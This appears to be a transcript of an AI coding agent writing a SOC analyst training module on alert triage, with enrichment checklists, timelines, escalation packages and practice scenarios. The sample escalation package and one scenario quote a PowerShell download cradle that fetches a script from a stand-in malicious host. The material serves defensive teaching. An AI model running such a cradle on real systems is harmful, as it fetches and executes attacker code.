**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 34.7s)

_Thinking:_

Good, Module 1 is done. Now let me create Module 2 - Alert Triage Methodology, which is one of the most important modules.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 162.9s)

_Thinking:_

Now let me create Module 2 - Alert Triage Methodology, which is the core L1 skill.

**Tool: write**

**Input:**
```json
{
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/02-alert-triage-methodology.md",
  "content": "# Module 2: Alert Triage Methodology\n\n**Priority: P0 — THE core L1 skill. Master this completely.**\n\n---\n\n## 2.1 The Triage Mindset\n\n> **Triage (noun)**: *The process of determining the priority of patients' treatments based on the severity of their condition.*\n\nIn SOC: **Rapidly classify alerts to spend time on what matters.**\n\n### The Golden Rule\n> **Every alert deserves context. No alert deserves assumption.**\n\n### L1 Triage Time Budget\n| Alert Type | Target Time | Max Time |\n|------------|-------------|----------|\n| P1/Critical | 5-10 min | 15 min |\n| P2/High | 10-20 min | 30 min |\n| P3/Medium | 20-30 min | 45 min |\n| P4/Low | Batch review | 60 min |\n\n**If you exceed max time → Escalate with \"inconclusive, needs deeper investigation\"**\n\n---\n\n## 2.2 The 20-Question Triage Framework\n\nFor **EVERY alert**, systematically answer:\n\n| # | Question | Source | Why It Matters |\n|---|----------|--------|----------------|\n| 1 | **What triggered it?** | Alert detail, rule name, detection logic | Understand the hypothesis |\n| 2 | **Which asset is involved?** | Hostname, IP, cloud resource ID | Asset criticality, ownership |\n| 3 | **Which user is involved?** | Username, SID, UPN, email | Privilege level, department, risk |\n| 4 | **What happened?** | Event description, MITRE technique | Behavioral context |\n| 5 | **When did it happen?** | Timestamp, timezone, duration | Timeline, correlation window |\n| 6 | **What process caused it?** | Image path, PID, hash, command line | Execution context |\n| 7 | **What parent process spawned it?** | Parent image, parent PID, parent command line | Process tree, living-off-land |\n| 8 | **What command line was executed?** | Full command line, encoded args | Intent, obfuscation, IOCs |\n| 9 | **What network connections occurred?** | Src/Dst IP:Port, protocol, direction, bytes | C2, lateral, exfil, beaconing |\n| 10 | **What files were created/modified?** | Path, hash, size, entropy, signature | Malware, staging, persistence |\n| 11 | **What authentication occurred?** | Logon type, source, target, result | Credential theft, lateral, brute force |\n| 12 | **What happened BEFORE the alert?** | 30-60 min prior timeline | Initial access, staging |\n| 13 | **What happened AFTER the alert?** | 30-60 min post timeline | Execution, persistence, C2 |\n| 14 | **Is there evidence of persistence?** | Run keys, services, tasks, WMI, startup | Foothold maintenance |\n| 15 | **Is there lateral movement?** | SMB, RDP, WinRM, SSH, Pass-the-Hash | Spread |\n| 16 | **Is there C2 communication?** | Beaconing, domain gen, unusual ports, TLS anomalies | Command channel |\n| 17 | **Is there data exfiltration?** | Large uploads, cloud storage, archive creation | Data theft |\n| 18 | **Classification: Malicious / Benign / Inconclusive?** | Evidence-based decision | Drives action |\n| 19 | **What evidence supports the conclusion?** | Specific logs, hashes, IPs, behavior | Defensible, auditable |\n| 20 | **Should it be escalated?** | Severity, confidence, asset criticality, SLA | Next step |\n\n---\n\n## 2.3 Alert Enrichment Checklist\n\n### User Context (AD / Entra ID / HR)\n- [ ] Department, title, manager\n- [ ] Group memberships (Domain Admins? VPN users? Service accounts?)\n- [ ] Last password change, MFA status, risky sign-ins\n- [ ] Recent travel, impossible travel alerts\n- [ ] Terminated? On leave? Contractor?\n\n### Asset Context (CMDB / EDR / Vuln Mgmt)\n- [ ] Role: DC, File Server, Workstation, Laptop, Kiosk, IoT\n- [ ] Criticality: Tier 0/1/2/3\n- [ ] OS, patch level, EDR status (active? healthy? tampered?)\n- [ ] Installed software (Office? Python? Remote admin tools?)\n- [ ] Recent alerts, vulnerability findings\n- [ ] Network segment (DMZ, Internal, Cloud, OT)\n\n### Process Context (EDR / Sysmon)\n- [ ] Full process tree (3+ levels up)\n- [ ] Command line (decoded if encoded)\n- [ ] Parent process legitimacy (signed? expected parent?)\n- [ ] Hash reputation (VT, internal allowlist, NSRL)\n- [ ] MITRE tags on process behavior\n- [ ] Child processes spawned\n\n### Network Context (NDR / Proxy / Firewall / DNS)\n- [ ] Destination IP reputation (malicious, suspicious, benign, unknown)\n- [ ] Domain reputation, age, registrar, hosting provider\n- [ ] Connection pattern: single, burst, periodic (beaconing)\n- [ ] Protocol anomalies: HTTP on 443, DNS over HTTPS, non-standard ports\n- [ ] TLS fingerprint (JA3), SNI, certificate details\n- [ ] Bytes transferred, direction, duration\n\n### Authentication Context (AD / VPN / Cloud / MFA)\n- [ ] Logon type (2=Interactive, 3=Network, 4=Batch, 5=Service, 7=Unlock, 8=NetworkCleartext, 9=NewCredentials, 10=RemoteInteractive, 11=CachedInteractive)\n- [ ] Source IP, workstation name\n- [ ] Success/Failure (0x0, 0xC000006A, 0xC000006D, 0xC000006F, 0xC0000070, 0xC0000072, 0xC000015B, 0xC000018C, 0xC000019B, 0xC0000224, 0xC0000225, 0xC0000234, 0xC00002EE)\n- [ ] MFA challenge/result\n- [ ] Impossible travel, new device, anonymous IP\n\n### Threat Intelligence Enrichment\n- [ ] IP reputation (AbuseIPDB, AlienVault, internal TIP, VT)\n- [ ] Domain reputation (age, passive DNS, hosting, registrar)\n- [ ] Hash reputation (VT, Hybrid Analysis, MalwareBazaar, internal)\n- [ ] Actor/campaign association\n- [ ] MITRE technique mapping\n- [ ] Confidence score, TLP marking\n\n---\n\n## 2.4 Context Gathering Workflow\n\n```\nALERT RECEIVED\n      │\n      ▼\n┌─────────────────────────────────────┐\n│  1. PARSE ALERT METADATA            │\n│  - Rule name, severity, timestamp   │\n│  - Entities: host, user, process, IP│\n└─────────────────────┬───────────────┘\n                      ▼\n┌─────────────────────────────────────┐\n│  2. AUTOMATED ENRICHMENT (SOAR)     │\n│  - TI lookup (IP, domain, hash)     │\n│  - Asset info (CMDB, EDR)           │\n│  - User info (AD, HR)               │\n│  - Recent alerts (same host/user)   │\n└─────────────────────┬───────────────┘\n                      ▼\n┌─────────────────────────────────────┐\n│  3. MANUAL DEEP DIVE (Time-boxed)   │\n│  - Process tree + command lines     │\n│  - Network connections + reputation │\n│  - File/registry artifacts          │\n│  - Authentication timeline          │\n│  - Pre/Post 60-min timeline         │\n└─────────────────────┬───────────────┘\n                      ▼\n┌─────────────────────────────────────┐\n│  4. CLASSIFY & DECIDE               │\n│  - TP: Escalate with package        │\n│  - FP: Close, document, tune rule   │\n│  - BP: Close, document context      │\n│  - Inconclusive: Extend / Escalate  │\n└─────────────────────┬───────────────┘\n                      ▼\n┌─────────────────────────────────────┐\n│  5. DOCUMENT & HANDOFF              │\n│  - Case notes with evidence         │\n│  - MITRE mapping                    │\n│  - Severity/Priority                │\n│  - Recommended actions              │\n└─────────────────────────────────────┘\n```\n\n---\n\n## 2.5 Timeline Construction\n\n### Why Timeline Matters\n- **Causality**: What caused what?\n- **Scope**: How far did it spread?\n- **Root cause**: Where did it start?\n- **Attribution**: Actor behavior patterns\n\n### Timeline Granularity\n| Phase | Window | Focus |\n|-------|--------|-------|\n| **Immediate** | T-5min to T+5min | Alert trigger, process execution, network conn |\n| **Tactical** | T-60min to T+60min | Initial access, staging, lateral, persistence |\n| **Operational** | T-24h to T+24h | Campaign pattern, repeated access, data staging |\n| **Strategic** | Days/Weeks | Dwell time, actor infrastructure, full kill chain |\n\n### Timeline Sources (Prioritized)\n1. **EDR** — Process, file, registry, network, memory (highest fidelity)\n2. **Sysmon** — Process create, network, file, registry, DNS, image load\n3. **Windows Security Log** — Auth (4624/4625), process (4688), audit policy changes\n4. **NDR/Proxy/Firewall** — Network flows, DNS, HTTP, TLS metadata\n5. **Cloud/Identity** — Sign-ins, API calls, resource changes\n6. **Email** — Delivery, clicks, attachments\n7. **Vuln Scanner** — Recent scans (explain vuln scan alerts)\n\n### Building a Timeline (Practical)\n```\n1. Query: \"Show all events for host X from T-60 to T+60\"\n2. Filter: Remove noise (heartbeats, routine updates, health checks)\n3. Tag: Color-code by type (Auth=Blue, Process=Green, Net=Red, File=Yellow)\n4. Annotate: Mark alert trigger, suspicious nodes, gaps\n5. Narrative: \"At 03:12, user clicked link → 03:13 PowerShell download → 03:14 C2 beacon\"\n```\n\n---\n\n## 2.6 Correlation: Connecting the Dots\n\n### Types of Correlation\n| Type | Example | L1 Action |\n|------|---------|-----------|\n| **Same Host** | Alert A (PowerShell) + Alert B (C2 IP) same host | Merge into single case |\n| **Same User** | Failed VPN → Success VPN → Suspicious mailbox access | Track user journey |\n| **Same IP** | Multiple hosts beaconing to same C2 | Campaign detection |\n| **Same Technique** | Scheduled task creation on 5 hosts in 1 hour | Cluster → Hunt |\n| **Kill Chain** | Phishing → Credential theft → VPN → Lateral → Exfil | Full incident |\n\n### Correlation in Practice\n```\nAlert: \"Suspicious PowerShell - Encoded Command\"\nHost: WORKSTN-047\nUser: j.smith\n\nCORRELATION CHECKS:\n☐ Other alerts on WORKSTN-047 in 24h?\n☐ Other alerts for j.smith in 24h?\n☐ Other hosts with same PowerShell command?\n☐ Same C2 IP in other alerts?\n☐ Recent phishing emails to j.smith?\n☐ VPN logs for j.smith?\n☐ File shares accessed by j.smith?\n```\n\n---\n\n## 2.7 Evidence Collection for Escalation\n\n### The \"Escalation Package\" — What L2 Needs\n```\n┌────────────────────────────────────────────────────────────┐\n│ ESCALATION PACKAGE: INC-2024-001234                        │\n├────────────────────────────────────────────────────────────┤\n│ ALERT: Suspicious PowerShell - Encoded Command (P2)       │\n│ HOST: WORKSTN-047 (Marketing, Tier 2)                     │\n│ USER: j.smith@company.com (Standard user, MFA enabled)    │\n│ TIME: 2024-01-15 03:12:47 UTC                              │\n├────────────────────────────────────────────────────────────┤\n│ PROCESS TREE:                                              │\n│ WINWORD.EXE (PID 4521)                                     │\n│  └── POWERSHELL.EXE (PID 5102) -enc \"JABjAGwA...\"         │\n│       └── CMD.EXE (PID 5188) /c whoami                     │\n│       └── POWERSHELL.EXE (PID 5201) IEX (Download...)      │\n├────────────────────────────────────────────────────────────┤\n│ DECODED COMMAND:                                           │\n│ IEX (New-Object Net.WebClient).DownloadString(             │\n│   'http://malicious-domain.com/payload.ps1')               │\n├────────────────────────────────────────────────────────────┤\n│ NETWORK:                                                   │\n│ 03:12:49 TCP 10.10.20.47:52311 → 203.0.113.45:80 (HTTP)  │\n│ 03:13:02 TLS 10.10.20.47:52315 → 203.0.113.45:443 (JA3:  │\n│   a0e9f5d64349fb13191bc781f81f42e1) SNI: malicious-domain.com│\n├────────────────────────────────────────────────────────────┤\n│ FILE ARTIFACTS:                                            │\n│ C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.ps1 (SHA256:   │\n│   a1b2c3d4... VT: 42/72 Trojan.Downloader)                │\n├────────────────────────────────────────────────────────────┤\n│ AUTHENTICATION:                                            │\n│ 03:10:22 4624 Logon Type 10 (RDP) from 10.10.10.50        │\n│ 03:11:05 4624 Logon Type 3 (Network) from 10.10.10.50     │\n├────────────────────────────────────────────────────────────┤\n│ THREAT INTEL:                                              │\n│ IP 203.0.113.45: VT 15/92 (C2, Cobalt Strike),            │\n│   AbuseIPDB 89% confidence, associated with APT29         │\n│ Domain malicious-domain.com: Registered 2024-01-10,        │\n│   Namecheap, hosted on Bulletproof Hosting AS12345         │\n├────────────────────────────────────────────────────────────┤\n│ CLASSIFICATION: TRUE POSITIVE                              │\n│ EVIDENCE: Decoded cmd → malicious download → C2 beacon →  │\n│   known bad IP/domain → malware hash                       │\n│ MITRE: T1059.001, T1105, T1071.001, T1055                 │\n│ SEVERITY: P2 (Active C2, user workstation, no lateral yet)│\n│ RECOMMENDED: Isolate host, block IP/domain, disable user,  │\n│   escalate to L2 for memory forensics                      │\n└────────────────────────────────────────────────────────────┘\n```\n\n---\n\n## 2.8 Classification Decision Matrix\n\n```\n                    ┌─────────────────────┐\n                    │   EVIDENCE LEVEL    │\n                    └──────────┬──────────┘\n                               │\n              ┌────────────────┼────────────────┐\n              ▼                ▼                ▼\n       ┌────────────┐   ┌────────────┐   ┌────────────┐\n       │  STRONG    │   │  MODERATE  │   │  WEAK/     │\n       │  MALICIOUS │   │  SUSPICIOUS│   │  NONE      │\n       │  INDICATORS│   │  INDICATORS│   │  INDICATORS│\n       └─────┬──────┘   └─────┬──────┘   └─────┬──────┘\n             │                │                │\n             ▼                ▼                ▼\n       ┌────────────┐   ┌────────────┐   ┌────────────┐\n       │ TRUE       │   │ INCONCLUSIVE│  │ FALSE /    │\n       │ POSITIVE   │   │ (Time-box   │  │ BENIGN     │\n       │            │   │  extend,    │  │ POSITIVE   │\n       │ ESCALATE   │   │ gather more)│  │            │\n       └────────────┘   └────────────┘   └────────────┘\n```\n\n### Strong Malicious Indicators (→ True Positive)\n- Known malicious hash/IP/domain (high-confidence TI)\n- Decoded command downloads/executes payload\n- C2 beaconing pattern (regular interval, long-lived)\n- Credential dumping tools (mimikatz, sekurlsa, comsvcs.dll)\n- Persistence artifacts (Run keys, services, WMI, scheduled tasks)\n- Lateral movement evidence (SMB admin$, RDP, Pass-the-Hash)\n- Ransomware behavior (mass encryption, ransom notes)\n\n### Moderate Suspicious Indicators (→ Inconclusive → Deepen)\n- Encoded PowerShell without clear payload\n- Rare but not known-bad process execution\n- Unusual network connection (new geo, rare port)\n- Single failed login anomaly\n- Unsigned script execution\n- Living-off-land binary (LOLBins) with odd args\n\n### Weak/No Indicators (→ False Positive / Benign Positive)\n- Vulnerability scanner source IP\n- Admin running authorized script\n- Software update / patch deployment\n- Legitimate admin tool (PSExec, ADFind, BloodHound) by known admin\n- Backup agent, monitoring agent behavior\n- False positive pattern documented in runbook\n\n---\n\n## 2.9 Root Cause Analysis Basics (L1 Level)\n\n**L1 does NOT do full RCA. L1 identifies *probable* root cause for escalation.**\n\n### 5 Whys for SOC (Simplified)\n```\nAlert: PowerShell encoded command\nWhy? → Word spawned PowerShell\nWhy? → User opened malicious document\nWhy? → Phishing email delivered\nWhy? → Email gateway missed it\nWhy? → Signature not updated / Zero-day\n→ Root cause: Phishing delivery gap\n```\n\n### L1 Root Cause Categories\n| Category | Indicators | Escalation Note |\n|----------|------------|-----------------|\n| **Phishing** | Email → Click → Execution | Include email headers, URL, attachment hash |\n| **Drive-by / Web** | Browser → Download → Execution | Proxy logs, referrer, URL reputation |\n| **Valid Account** | VPN/RDP → Recon → Lateral | Source IP, geo, MFA status, password age |\n| **Exploit** | Public-facing app → Shell → Persistence | WAF logs, vuln scan, patch status |\n| **Supply Chain** | Trusted software → Malicious update | Vendor advisory, hash mismatch |\n| **Insider** | Data access → Staging → Exfil | HR context, DLP alerts, access justification |\n\n---\n\n## 2.10 Common Triage Pitfalls\n\n| Pitfall | Symptom | Fix |\n|---------|---------|-----|\n| **Alert fatigue closing** | \"Seen this 100x, must be FP\" | Every alert: fresh enrichment, check for changes |\n| **Single-source reliance** | Only checked EDR, missed NDR auth | Always check: Endpoint + Network + Auth + Email |\n| **No timeline** | \"Alert at 03:00, what happened before?\" | Mandatory T-60/T+60 query |\n| **Shallow process analysis** | \"PowerShell ran\" (no tree, no cmdline) | Always: Parent, Command Line, Children, Hash |\n| **Ignoring asset criticality** | Same triage for DC and kiosk | Tier 0/1 assets: lower threshold, faster escalation |\n| **No threat intel check** | \"IP looks weird\" (no VT/AbuseIPDB) | Automated + manual TI on every external indicator |\n| **Weak documentation** | \"Investigated, looks ok\" | Evidence → Conclusion → Action, every time |\n| **Escalating without package** | L2 asks \"what's the host role?\" | Package: host, user, process tree, network, TI, timeline |\n\n---\n\n## 2.11 Practical Triage Scenarios (Mental Reps)\n\n### Scenario A: \"Multiple Failed Logins → Success\"\n```\nAlert: 4625 x 15 (03:00-03:05) → 4624 (03:05) from 192.168.1.50\nUser: svc_backup (Service Account)\nHost: FILESRV-01 (Tier 1)\n\nTRIAGE:\n1. Source IP: Internal (192.168.1.50) → Check host\n2. 192.168.1.50 = BACKUP-SRV → Legitimate backup server?\n3. Check svc_backup: Password never expires? Last change 2020?\n4. Backup job schedule: Runs 03:00 daily?\n5. Logon Type: 4 (Batch) or 5 (Service)?\n6. If Batch/Service + scheduled → BENIGN POSITIVE (document)\n7. If Interactive (2) or Network (3) + unusual time → TRUE POSITIVE\n```\n\n### Scenario B: \"PowerShell from Word\"\n```\nAlert: WINWORD.EXE → POWERSHELL.EXE -enc ...\nHost: WORKSTN-088 (Finance)\nUser: a.chen@company.com\n\nTRIAGE:\n1. Process tree: WINWORD → POWERSHELL (suspicious parent)\n2. Decode command: IEX (DownloadString 'http://bad.com/x.ps1')\n3. Network: PowerShell → 203.0.113.100:80 (HTTP GET /x.ps1)\n4. TI: IP = Known C2 (Cobalt Strike), Domain = 2 days old\n5. File: %TEMP%\\x.ps1 hash = Trojan.Downloader (VT 38/72)\n6. Timeline: 03:10 Email received (phish), 03:11 Doc opened, 03:12 Alert\n7. Classification: TRUE POSITIVE → ESCALATE P1\n```\n\n### Scenario C: \"RDP from Admin Account at 03:00\"\n```\nAlert: 4624 Logon Type 10 (RDP) User: admin.jdoe Source: 45.33.22.11\nHost: DC01 (Tier 0)\nTime: 03:15 UTC\n\nTRIAGE:\n1. User: Domain Admin? Yes. MFA? Enabled.\n2. Source IP: 45.33.22.11 → VPNCORP exit? No → Residential ISP (Comcast)\n3. Geo: IP = New York, Admin home = Chicago → Impossible travel?\n4. Recent travel? No. VPN log? No VPN session.\n5. MFA log: Push accepted at 03:14 from \"Microsoft Authenticator\"\n6. Device: New device? Yes (unknown device fingerprint)\n7. Check admin.jdoe: On-call? No. Ticket? No.\n8. Classification: TRUE POSITIVE (compromised creds + MFA bypass) → ESCALATE P1\n```\n\n---\n\n## 2.12 Triage Runbook Template\n\n```markdown\n# RUNBOOK: [Alert Rule Name / MITRE Technique]\n\n## Trigger\n- Rule: [Name/ID]\n- Severity: [P1-P4]\n- MITRE: [TXXXX.XXX]\n\n## Automated Enrichment (SOAR)\n- [ ] TI: IP/Domain/Hash reputation\n- [ ] Asset: Criticality, Tier, EDR status\n- [ ] User: Groups, MFA, Risky sign-ins\n- [ ] Recent: Same host/user alerts 24h\n\n## Manual Investigation Steps\n1. **Process Tree**: Query EDR for [process] on [host] T-30/T+30\n   - Expected: [legitimate parent/children]\n   - Suspicious: [known bad patterns]\n2. **Command Line**: Full cmdline, decode if encoded\n   - Look for: [download cradles, obfuscation, LOLBins]\n3. **Network**: Connections from [process] on [host]\n   - Check: [beaconing, C2 IPs, data transfer]\n4. **Files**: Created/modified by [process]\n   - Hash check: [VT, internal allowlist]\n5. **Auth**: Logons for [user] on [host] T-60/T+60\n   - Types: [interactive, network, RDP, service]\n6. **Timeline**: Correlate all above + email/proxy/cloud\n\n## Decision Criteria\n| Classification | Criteria | Action |\n|----------------|----------|--------|\n| TRUE POSITIVE | [Specific evidence] | Escalate P[1-2], contain |\n| FALSE POSITIVE | [Known FP pattern] | Close, tune rule |\n| BENIGN POSITIVE | [Authorized activity] | Close, document |\n| INCONCLUSIVE | [Missing evidence] | Extend 30min, then escalate |\n\n## Escalation Package Template\n- Alert details\n- Process tree + cmdlines\n- Network connections + TI\n- File hashes + reputation\n- Auth timeline\n- MITRE mapping\n- Recommended containment\n```\n\n---\n\n## 2.13 Interview Questions for This Module\n\n1. **Walk me through your triage process for a \"Suspicious PowerShell\" alert.**\n   - Parse alert → Auto-enrich (TI, asset, user) → Process tree → Decode cmdline → Network → Files → Auth → Timeline → Classify → Package → Escalate/Close\n\n2. **What's the difference between False Positive and Benign Positive?**\n   - FP: Alert logic error (no malicious activity). BP: Alert correctly fired on authorized/expected activity (admin script, vuln scan).\n\n3. **An alert shows 20 failed logins then success. How do you triage?**\n   - Check source IP (internal vs external), user type (service vs human), logon type, schedule, geo, MFA. Context determines TP/FP/BP.\n\n4. **What is an \"escalation package\" and what must it contain?**\n   - Alert details, process tree, command lines, network connections + TI, file hashes, auth timeline, MITRE mapping, severity, recommended actions.\n\n5. **How do you handle an alert where you can't determine TP/FP in 15 minutes?**\n   - Classify \"Inconclusive\", document what you checked, what's missing, request specific additional data (memory dump, packet capture), escalate to L2 with \"needs deeper investigation\".\n\n6. **Why is the process tree critical in triage?**\n   - Parent process reveals initial access vector (Word → PowerShell = phishing; Services.exe → PowerShell = service exploit; explorer.exe → PowerShell = user execution).\n\n7. **What logon types indicate interactive vs service vs network logon?**\n   - 2=Interactive, 3=Network, 4=Batch, 5=Service, 7=Unlock, 10=RemoteInteractive (RDP), 11=CachedInteractive.\n\n---\n\n## 2.14 Study Checklist for Module 2\n\n- [ ] Recite 20-question framework from memory\n- [ ] Complete enrichment checklist for user, asset, process, network, auth, TI\n- [ ] Build timeline from T-60 to T+60 with color-coded event types\n- [ ] Perform correlation checks (same host, user, IP, technique, kill chain)\n- [ ] Write escalation package with all required sections\n- [ ] Apply classification decision matrix to 5 practice scenarios\n- [ ] Identify root cause category for 5 sample alerts\n- [ ] Avoid all 8 common triage pitfalls in practice\n- [ ] Answer all 7 interview questions without notes\n\n---\n\n*Next: Module 3 — Incident Severity and Escalation*"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 37.3s)

_Thinking:_

Module 2 is done. Now let me continue with Module 3 - Incident Severity and Escalation.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
